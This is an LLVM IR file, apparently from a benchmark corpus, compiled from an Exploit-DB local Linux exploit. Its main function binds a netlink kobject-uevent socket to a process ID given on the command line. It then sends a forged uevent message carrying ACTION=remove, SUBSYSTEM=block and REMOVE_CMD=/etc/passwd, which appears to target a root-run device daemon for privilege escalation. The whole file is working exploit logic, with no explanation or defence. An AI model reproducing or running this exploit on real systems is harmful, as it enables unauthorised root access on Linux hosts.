; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_41886.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_41886.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.msghdr = type { i32, i32, %struct.iovec*, i8* }
%struct.iovec = type { i32, i8* }
%struct.sockaddr_nl = type { i64, i32, i32 }
%struct.sockaddr = type { i32 }

@AF_NETLINK = common dso_local global i32 0, align 4
@SOCK_DGRAM = common dso_local global i32 0, align 4
@NETLINK_KOBJECT_UEVENT = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [5 x i8] c"a@/d\00", align 1
@.str.1 = private unnamed_addr constant [16 x i8] c"SUBSYSTEM=block\00", align 1
@.str.2 = private unnamed_addr constant [17 x i8] c"DEVPATH=/dev/foo\00", align 1
@.str.3 = private unnamed_addr constant [11 x i8] c"TIMEOUT=10\00", align 1
@.str.4 = private unnamed_addr constant [14 x i8] c"ACTION=remove\00", align 1
@.str.5 = private unnamed_addr constant [23 x i8] c"REMOVE_CMD=/etc/passwd\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca [4096 x i8], align 16
  %9 = alloca %struct.msghdr, align 8
  %10 = alloca %struct.iovec, align 8
  %11 = alloca %struct.sockaddr_nl, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = call i32 @memset(%struct.sockaddr_nl* %11, i32 0, i32 16)
  %13 = load i32, i32* @AF_NETLINK, align 4
  %14 = getelementptr inbounds %struct.sockaddr_nl, %struct.sockaddr_nl* %11, i32 0, i32 2
  store i32 %13, i32* %14, align 4
  %15 = load i8**, i8*** %5, align 8
  %16 = getelementptr inbounds i8*, i8** %15, i64 1
  %17 = load i8*, i8** %16, align 8
  %18 = call i32 @atoi(i8* %17)
  %19 = getelementptr inbounds %struct.sockaddr_nl, %struct.sockaddr_nl* %11, i32 0, i32 1
  store i32 %18, i32* %19, align 8
  %20 = getelementptr inbounds %struct.sockaddr_nl, %struct.sockaddr_nl* %11, i32 0, i32 0
  store i64 0, i64* %20, align 8
  %21 = bitcast %struct.sockaddr_nl* %11 to i8*
  %22 = getelementptr inbounds %struct.msghdr, %struct.msghdr* %9, i32 0, i32 3
  store i8* %21, i8** %22, align 8
  %23 = getelementptr inbounds %struct.msghdr, %struct.msghdr* %9, i32 0, i32 0
  store i32 16, i32* %23, align 8
  %24 = getelementptr inbounds %struct.msghdr, %struct.msghdr* %9, i32 0, i32 2
  store %struct.iovec* %10, %struct.iovec** %24, align 8
  %25 = getelementptr inbounds %struct.msghdr, %struct.msghdr* %9, i32 0, i32 1
  store i32 1, i32* %25, align 4
  %26 = load i32, i32* @AF_NETLINK, align 4
  %27 = load i32, i32* @SOCK_DGRAM, align 4
  %28 = load i32, i32* @NETLINK_KOBJECT_UEVENT, align 4
  %29 = call i32 @socket(i32 %26, i32 %27, i32 %28)
  store i32 %29, i32* %6, align 4
  %30 = load i32, i32* %6, align 4
  %31 = bitcast %struct.sockaddr_nl* %11 to %struct.sockaddr*
  %32 = call i32 @bind(i32 %30, %struct.sockaddr* %31, i32 16)
  %33 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  store i8* %33, i8** %7, align 8
  %34 = load i8*, i8** %7, align 8
  %35 = call i64 @sprintf(i8* %34, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0))
  %36 = add nsw i64 %35, 1
  %37 = load i8*, i8** %7, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 %36
  store i8* %38, i8** %7, align 8
  %39 = load i8*, i8** %7, align 8
  %40 = call i64 @sprintf(i8* %39, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i64 0, i64 0))
  %41 = add nsw i64 %40, 1
  %42 = load i8*, i8** %7, align 8
  %43 = getelementptr inbounds i8, i8* %42, i64 %41
  store i8* %43, i8** %7, align 8
  %44 = load i8*, i8** %7, align 8
  %45 = call i64 @sprintf(i8* %44, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.2, i64 0, i64 0))
  %46 = add nsw i64 %45, 1
  %47 = load i8*, i8** %7, align 8
  %48 = getelementptr inbounds i8, i8* %47, i64 %46
  store i8* %48, i8** %7, align 8
  %49 = load i8*, i8** %7, align 8
  %50 = call i64 @sprintf(i8* %49, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i64 0, i64 0))
  %51 = add nsw i64 %50, 1
  %52 = load i8*, i8** %7, align 8
  %53 = getelementptr inbounds i8, i8* %52, i64 %51
  store i8* %53, i8** %7, align 8
  %54 = load i8*, i8** %7, align 8
  %55 = call i64 @sprintf(i8* %54, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0))
  %56 = add nsw i64 %55, 1
  %57 = load i8*, i8** %7, align 8
  %58 = getelementptr inbounds i8, i8* %57, i64 %56
  store i8* %58, i8** %7, align 8
  %59 = load i8*, i8** %7, align 8
  %60 = call i64 @sprintf(i8* %59, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.5, i64 0, i64 0))
  %61 = add nsw i64 %60, 1
  %62 = load i8*, i8** %7, align 8
  %63 = getelementptr inbounds i8, i8* %62, i64 %61
  store i8* %63, i8** %7, align 8
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %65 = getelementptr inbounds %struct.iovec, %struct.iovec* %10, i32 0, i32 1
  store i8* %64, i8** %65, align 8
  %66 = load i8*, i8** %7, align 8
  %67 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %68 = ptrtoint i8* %66 to i64
  %69 = ptrtoint i8* %67 to i64
  %70 = sub i64 %68, %69
  %71 = trunc i64 %70 to i32
  %72 = getelementptr inbounds %struct.iovec, %struct.iovec* %10, i32 0, i32 0
  store i32 %71, i32* %72, align 8
  %73 = load i32, i32* %6, align 4
  %74 = call i32 @sendmsg(i32 %73, %struct.msghdr* %9, i32 0)
  %75 = load i32, i32* %6, align 4
  %76 = call i32 @close(i32 %75)
  ret i32 0
}

declare dso_local i32 @memset(%struct.sockaddr_nl*, i32, i32) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @bind(i32, %struct.sockaddr*, i32) #1

declare dso_local i64 @sprintf(i8*, i8*) #1

declare dso_local i32 @sendmsg(i32, %struct.msghdr*, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
